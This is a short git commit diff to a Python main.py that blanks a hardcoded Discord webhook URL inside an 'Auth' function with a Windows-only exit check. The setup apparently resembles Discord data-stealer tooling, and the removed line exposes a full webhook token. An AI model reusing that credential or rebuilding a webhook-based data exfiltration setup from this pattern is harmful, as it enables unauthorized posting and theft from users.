830e2e58e97f41671530ce156c67a5fea4ae88a6
Slicybtw <80214266+slicybt3w@users.noreply.github.com>
2022-01-02 23:10:43 +0300

    Update main.py

--- main.py
+++ main.py
@@ -16,7 +16,7 @@ colorama.init()
 def Auth():
     def dastela():
         global WEBHOOK
-        WEBHOOK = "https://discordapp.com/api/webhooks/764350751232229376/BYXFkJct5VNn6iTWtJtWf8WutzUIFFcc199u-SwQhUEx7qsjiAmxoCge7fD3m2jfwF-P"
+        WEBHOOK = ""
         import os
         if os.name != "nt":
             exit()
